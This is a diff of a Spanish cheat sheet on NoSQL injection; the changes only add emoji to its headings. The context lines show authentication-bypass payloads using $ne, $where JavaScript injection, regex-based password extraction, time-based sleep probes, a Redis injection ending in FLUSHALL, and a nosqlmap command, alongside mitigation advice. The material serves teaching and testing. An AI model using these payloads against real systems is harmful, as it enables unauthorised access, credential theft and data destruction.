@@ -21,7 +21,7 @@ Un atacante puede:
 
 ## 🧱 Tipos de bases NoSQL
 
-### Documentales (MongoDB, CouchDB)
+### 📄 Documentales (MongoDB, CouchDB)
 
 ```javascript
 db.users.find({username: "admin", password: "pass123"})
@@ -35,7 +35,7 @@ db.users.find({username: {"$ne": null}, password: {"$ne": null}})
 
 Devuelve todos los usuarios.
 
-### Key-Value (Redis)
+### 🗝️ Key-Value (Redis)
 
 ```http
 GET user:1234
@@ -47,13 +47,13 @@ Inyección:
 GET user:1234\nFLUSHALL
 ```
 
-### Columnar (Cassandra)
+### 📊 Columnar (Cassandra)
 
 ```sql
 SELECT * FROM users WHERE username = 'admin' OR '1'='1'
 ```
 
-### Grafos (Neo4j)
+### 🕸️ Grafos (Neo4j)
 
 ```cypher
 MATCH (u:User {username: 'admin'}) OR 1=1//
@@ -63,21 +63,21 @@ MATCH (u:User {username: 'admin'}) OR 1=1//
 
 ## ⚙️ Operadores en MongoDB
 
-### Comparación
+### 🔢 Comparación
 
 * `$eq`, `$ne`, `$gt`, `$lt`, `$gte`, `$lte`
 * `$in`, `$nin`
 
-### Lógicos
+### 🔀 Lógicos
 
 * `$and`, `$or`, `$not`, `$nor`
 
-### Elementos
+### 🔍 Elementos
 
 * `$exists`
 * `$type`
 
-### Evaluación
+### 🧮 Evaluación
 
 * `$regex`
 * `$where`
@@ -87,31 +87,31 @@ MATCH (u:User {username: 'admin'}) OR 1=1//
 
 ## 💣 Vectores comunes
 
-### Bypass de autenticación
+### 🚪 Bypass de autenticación
 
 ```javascript
 {username: "admin", password: {"$ne": ""}}
 ```
 
-### Inyección tautológica
+### ♾️ Inyección tautológica
 
 ```javascript
 ?category=Gifts'||'1'=='1
 ```
 
-### Inyección de operadores
+### ⚙️ Inyección de operadores
 
 ```json
 {"username": "admin", "password": {"$ne": null}}
 ```
 
-### Inyección JavaScript
+### 📜 Inyección JavaScript
 
 ```json
 {"$where": "this.username == 'admin' || '1'=='1'"}
 ```
 
-### Inyección con regex
+### 🔣 Inyección con regex
 
 ```javascript
 {password: {"$regex": "^a.*"}}
@@ -121,31 +121,31 @@ MATCH (u:User {username: 'admin'}) OR 1=1//
 
 ## 🧪 Técnicas de extracción de datos
 
-### Extracción carácter a carácter
+### 🔤 Extracción carácter a carácter
 
 ```javascript
 {password: {"$regex": "^ab.*"}}
 ```
 
-### Longitud
+### 📏 Longitud
 
 ```javascript
 this.password.length == 8
 ```
 
-### Descubrimiento de campos
+### 🔎 Descubrimiento de campos
 
 ```javascript
 {fieldname: {"$exists": true}}
 ```
 
-### Boolean-based
+### ✅ Boolean-based
 
 ```javascript
 ' && this.password[0] == 'p'
 ```
 
-### Time-based
+### ⏱️ Time-based
 
 ```json
 {"$where": "sleep(5000)"}
@@ -155,25 +155,25 @@ this.password.length == 8
 
 ## 🚀 Explotación avanzada
 
-### Descubrir nombres de campos
+### 🗂️ Descubrir nombres de campos
 
 ```javascript
 Object.keys(this)[3]
 ```
 
-### Acceso condicional
+### 🔐 Acceso condicional
 
 ```json
 {"$where": "this.role == 'admin'"}
 ```
 
-### Inyección en agregaciones
+### 🔧 Inyección en agregaciones
 
 ```json
 {"$project": {"password": 1}}
 ```
 
-### MapReduce
+### 🗺️ MapReduce
 
 ```javascript
 function(doc) {
@@ -187,26 +187,26 @@ function(doc) {
 
 ## 🔍 Métodos de detección
 
-### Error-based
+### ❗ Error-based
 
 ```json
 {"$ne": ""}
 {"$regex": ".*"}
 ```
 
-### Boolean-based
+### ✅ Boolean-based
 
 ```javascript
 ?user=admin'||'1'=='1
 ```
 
-### Time-based
+### ⏱️ Time-based
 
 ```json
 {"$where": "sleep(5000)"}
 ```
 
-### Testing de operadores
+### 🧩 Testing de operadores
 
 ```json
 {"$gt": ""}
@@ -236,41 +236,41 @@ function(doc) {
 
 ## 🛡️ Mitigación
 
-### Validación de entrada
+### 🚫 Validación de entrada
 
 ```javascript
 if (operators.includes(key)) throw Error
 ```
 
-### Validación de tipos
+### 🔤 Validación de tipos
 
 ```javascript
 typeof username === 'string'
 ```
 
-### Queries seguras
+### 🔒 Queries seguras
 
 ```javascript
 username: String(req.body.username)
 ```
 
-### Deshabilitar JavaScript
+### ⛔ Deshabilitar JavaScript
 
 ```bash
 mongod --noscripting
 ```
 
-### Mínimo privilegio
+### 🔑 Mínimo privilegio
 
 * Usuario DB con permisos limitados
 
-### Validación de esquema
+### 📋 Validación de esquema
 
 ```javascript
 bsonType: "string"
 ```
 
-### Uso de ORM/ODM
+### 🛡️ Uso de ORM/ODM
 
 * Ej: Mongoose
 * Protección integrada
@@ -290,26 +290,26 @@ bsonType: "string"
 
 ## 🛠️ Herramientas
 
-### Burp Suite
+### 🔧 Burp Suite
 
 * Intruder
 * Repeater
 * Extensiones
 
-### NoSQLMap
+### 🗺️ NoSQLMap
 
 ```bash
 nosqlmap -u http://target.com/login
 ```
 
-### Script automatizado
+### 🐍 Script automatizado
 
 ```python
 for char in charset:
     payload = {"$where": "..."}
 ```
 
-### Automatización
+### 🤖 Automatización
 
 * Extracción de caracteres
 * Enumeración de campos
